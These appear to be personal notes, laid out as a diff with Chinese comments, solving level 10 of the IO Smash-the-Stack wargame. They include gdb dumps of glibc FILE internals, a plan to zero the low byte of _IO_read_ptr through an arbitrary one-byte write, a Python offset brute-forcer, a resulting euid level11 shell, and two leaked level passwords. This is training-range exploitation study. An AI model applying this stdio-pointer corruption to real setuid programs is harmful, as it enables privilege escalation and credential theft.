@@ -14,7 +14,8 @@ int main(int argc, char **argv){
 
         fread(pwfile.pass, 1, 20, fp);
         pwfile.pass[19] = 0;
-        ptr[atoi(argv[1])] = 0;
+        ptr[atoi(argv[1])] = 0;   //这里可以改写任意一个字节，想法是能否改写fp内部的指针，将指针指向
+                                  // 文件开头，这样下面读取的仍然是pass
         fread(pwfile.msg_err, 1, 19, fp);
         fclose(fp);
 
@@ -107,3 +108,130 @@ Dump of assembler code for function main:
    0x080485da <+278>:   ret    
 End of assembler dump.
 (gdb) 
+
+
+/* test.c */
+#include <stdio.h>
+int main()
+{
+    FILE *file;
+    char buf[20] = {0};
+    file = fopen("1.txt","r");
+    fread(buf, 1, 5, file);
+    printf("%s",buf);
+    return 0;
+}
+
+level10@io:/tmp/level10$ gcc -ggdb -o test test.c
+
+/* fread之前 */
+(gdb) p *file
+$2 = {
+  _flags = -72539000, 
+  _IO_read_ptr = 0x0, 
+  _IO_read_end = 0x0, 
+  _IO_read_base = 0x0, 
+  _IO_write_base = 0x0, 
+  _IO_write_ptr = 0x0, 
+  _IO_write_end = 0x0, 
+  _IO_buf_base = 0x0, 
+  _IO_buf_end = 0x0, 
+  _IO_save_base = 0x0, 
+  _IO_backup_base = 0x0, 
+  _IO_save_end = 0x0, 
+  _markers = 0x0, 
+  _chain = 0xb7fcf580, 
+  _fileno = 7, 
+  _flags2 = 0, 
+  _old_offset = 0, 
+  _cur_column = 0, 
+  _vtable_offset = 0 '\000', 
+  _shortbuf = "", 
+  _lock = 0x804a0a0, 
+  _offset = -1, 
+  __pad1 = 0x0, 
+  __pad2 = 0x804a0ac, 
+  __pad3 = 0x0, 
+  __pad4 = 0x0, 
+  __pad5 = 0, 
+  _mode = 0, 
+  _unused2 = '\000' <repeats 39 times>
+}
+
+/* fread之后 */
+(gdb) p *file
+$3 = {
+  _flags = -72539000, 
+  _IO_read_ptr = 0xb7fde005 "BBBBBBBBB\n", 
+  _IO_read_end = 0xb7fde00f "", 
+  _IO_read_base = 0xb7fde000 "aaaaaBBBBBBBBB\n", 
+  _IO_write_base = 0xb7fde000 "aaaaaBBBBBBBBB\n", 
+  _IO_write_ptr = 0xb7fde000 "aaaaaBBBBBBBBB\n", 
+  _IO_write_end = 0xb7fde000 "aaaaaBBBBBBBBB\n", 
+  _IO_buf_base = 0xb7fde000 "aaaaaBBBBBBBBB\n", 
+  _IO_buf_end = 0xb7fdf000 "d\360\375\267\323\300\377\267", 
+  _IO_save_base = 0x0, 
+  _IO_backup_base = 0x0, 
+  _IO_save_end = 0x0, 
+  _markers = 0x0, 
+  _chain = 0xb7fcf580, 
+  _fileno = 7, 
+  _flags2 = 0, 
+  _old_offset = 0, 
+  _cur_column = 0, 
+  _vtable_offset = 0 '\000', 
+  _shortbuf = "", 
+  _lock = 0x804a0a0, 
+  _offset = -1, 
+  __pad1 = 0x0, 
+  __pad2 = 0x804a0ac, 
+  __pad3 = 0x0, 
+  __pad4 = 0x0, 
+  __pad5 = 0, 
+  _mode = -1, 
+  _unused2 = '\000' <repeats 39 times>
+}
+(gdb) 
+
+fread之后发现_IO_read_ptr发生了变化，想法：将_IO_read_ptr内容的低字节置为0(利用ptr[atoi(argv[1])] = 0)，
+这个赋值操作可以写入整个进程地址空间，而不仅仅是栈空间
+
+(gdb) p &(file->_IO_read_ptr)
+$6 = (char **) 0x000000000804a00c
+(gdb) p ptr
+$7 = 0x00000000bffffc74 "aaaaa"
+(gdb) 
+
+得到大致的偏移：0x804b00c-0xbffff4e4=1208269608 (from: http://www.blue-lotus.net/io-smaththestack-level-10/)
+这里的偏移是这么计算的:
+ 计算器中选择"双字"(32位，切记不要选择"四字")，然后计算
+
+level10@io:/tmp/level10$ cat p1.py 
+#!/usr/bin/env python
+import subprocess
+import sys
+
+start = 1208260000
+end = 1208290000
+for i in range(start, end):
+  try:
+    output = subprocess.check_call(["/levels//level10", str(i)])
+  except Exception:
+    continue
+
+
+  
+level10@io:/tmp/level10$ 
+level10@io:/tmp/level10$ python p1.py > 1.txt
+level10@io:/tmp/level10$ sort -u 1.txt 
+
+ACCESS DENIED...  
+AverYloNgPassword!!
+level10@io:/tmp/level10$
+level10@io:/levels$ ./level10 AverYloNgPassword\!\!
+sh-4.2$ id
+uid=1010(level10) gid=1010(level10) euid=1011(level11) groups=1011(level11),1010(level10),1029(nosu)
+sh-4.2$ cd /home/level11
+sh-4.2$ cat .pass
+oYZ4UoMIao6oPNhHCo
+sh-4.2$ 
